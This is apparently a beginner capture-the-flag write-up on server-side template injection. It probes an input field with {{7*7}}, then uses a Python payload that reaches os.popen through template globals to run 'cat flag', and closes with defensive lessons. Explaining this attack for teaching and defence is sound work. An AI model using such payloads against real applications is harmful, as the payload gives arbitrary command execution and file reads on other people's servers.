# Server-Side Template Injection (SSTI) - CTF Write-up

## Overview

**Challenge:** Server-Side Template Injection
**Platform:** CyLab
**Category:** Web Security
**Vulnerability:** Server-Side Template Injection (SSTI)
**Difficulty:** Beginner
**Objective:** Identify and exploit an SSTI vulnerability to retrieve the flag.

---

## 1. Initial Reconnaissance

The challenge presented a web application containing an input field where user-supplied content could be submitted to the server.

The initial objective was to determine how the application processed the submitted input.

Rather than immediately attempting to execute system commands, I first tested whether the input was being interpreted as a server-side template expression.

---

## 2. Testing for Template Injection

I submitted the following expression into the input field:

```text
{{7*7}}
```

The application processed the expression and returned:

```text
49
```

This was a significant finding.

Instead of displaying the input literally as:

```text
{{7*7}}
```

the server evaluated the mathematical expression and returned the result.

This indicated that the input was being processed by a server-side template engine.

### Screenshot

<img width="803" height="307" alt="image" src="https://github.com/user-attachments/assets/03ac69d3-6c1e-4d55-a518-60f78bbb5622" />
<img width="907" height="360" alt="image" src="https://github.com/user-attachments/assets/b962e7bd-417f-457a-bde7-e5fea158a70b" />

```text
![SSTI mathematical expression test](images/ssti-test.png)
```

---

# 3. Identifying the Vulnerability

The successful evaluation of `{{7*7}}` indicated a potential **Server-Side Template Injection (SSTI)** vulnerability.

SSTI occurs when an application embeds user-controlled input directly into a server-side template and allows the template engine to interpret that input as template code.

The basic attack flow was:

```text
User Input
    ↓
Server-Side Template Engine
    ↓
Template Expression Evaluated
    ↓
Result Returned to User
```

In this case:

```text
{{7*7}}
```

was evaluated by the server as:

```text
7 × 7 = 49
```

This confirmed that arbitrary template expressions could potentially be executed.

---

# 4. Exploiting the SSTI

After confirming that the template engine was evaluating expressions, I attempted to access functionality available within the server-side environment.

I submitted the following payload:

```text
{{ self.__init__.__globals__.__builtins__.__import__('os').popen('cat flag').read() }}
```

The payload navigates through Python objects and built-ins to access the `os` module, execute a command, and return its output.

The command executed was:

```text
cat flag
```

which reads the contents of the `flag` file.

The complete payload was:

```text
{{ self.__init__.__globals__.__builtins__.__import__('os').popen('cat flag').read() }}
```
<img width="927" height="199" alt="image" src="https://github.com/user-attachments/assets/7e9e8752-e4f4-4a62-ab87-ddf5674383c3" />

---

# 5. Retrieving the Flag

After submitting the payload, the application processed it through the server-side template engine.

Instead of returning the template expression itself, the application executed the command and displayed the contents of the flag file.

This confirmed that the SSTI vulnerability could be escalated from simple template expression evaluation to server-side command execution.

### Screenshot



```text
![SSTI command execution and flag](images/ssti-flag.png)
```

---

# 6. Attack Chain

The complete exploitation process was:

```text
Input Field
     ↓
Test {{7*7}}
     ↓
Server returns 49
     ↓
Confirm SSTI
     ↓
Identify Python object access
     ↓
Access built-in import functionality
     ↓
Import os module
     ↓
Execute "cat flag"
     ↓
Read command output
     ↓
Capture Flag
```

---

# 7. Vulnerability Analysis

The vulnerability was **Server-Side Template Injection (SSTI)** caused by the application evaluating user-controlled input as a server-side template.

The initial payload:

```text
{{7*7}}
```

was useful as a detection payload because it demonstrated that the server was evaluating the expression rather than treating it as ordinary text.

The vulnerability became significantly more serious when the template context could be used to access Python functionality and execute operating system commands.

This resulted in the following progression:

```text
Template Expression Evaluation
          ↓
Python Object Access
          ↓
OS Module Access
          ↓
Command Execution
          ↓
File Read
```

The impact of such a vulnerability can potentially extend beyond reading a CTF flag. Depending on the application's privileges and environment, SSTI can lead to sensitive information disclosure, arbitrary file access, and potentially remote code execution.

---

# 8. Key Security Lessons

### 1. Test whether user input is being interpreted

Simple expressions such as:

```text
{{7*7}}
```

can help identify whether an application is evaluating user-controlled input through a template engine.

### 2. User input should not be treated as template code

Applications should ensure that user-controlled data is passed to templates as data rather than being interpreted as part of the template itself.

### 3. SSTI can lead to severe consequences

A seemingly simple template injection can potentially escalate into:

* Sensitive information disclosure
* Arbitrary file reads
* Command execution
* Remote code execution
* Server compromise

### 4. Input validation alone may not be sufficient

The correct approach is to prevent untrusted input from being interpreted as template syntax in the first place.

---

# 9. Methodology Summary

| Stage             | Action                               | Result                          |
| ----------------- | ------------------------------------ | ------------------------------- |
| Reconnaissance    | Identified user input field          | Potential injection point found |
| Detection         | Submitted `{{7*7}}`                  | Server returned `49`            |
| Analysis          | Determined input was being evaluated | SSTI confirmed                  |
| Exploitation      | Submitted Python SSTI payload        | Server-side code execution      |
| Command Execution | Executed `cat flag`                  | Flag contents returned          |
| Post-Exploitation | Captured flag                        | Challenge completed             |

---

# Conclusion

This challenge demonstrated a **Server-Side Template Injection (SSTI)** vulnerability.

The vulnerability was initially identified by submitting the mathematical expression:

```text
{{7*7}}
```

The application returned `49`, confirming that the input was being interpreted by the server-side template engine.

I then escalated the test by using a Python-based SSTI payload to access the `os` module and execute:

```text
cat flag
```

The command output was returned by the application, revealing the flag.

### The main lesson from this challenge is that **server-side template injection can progress from simple expression evaluation to arbitrary code or command execution when the template environment exposes dangerous functionality**.
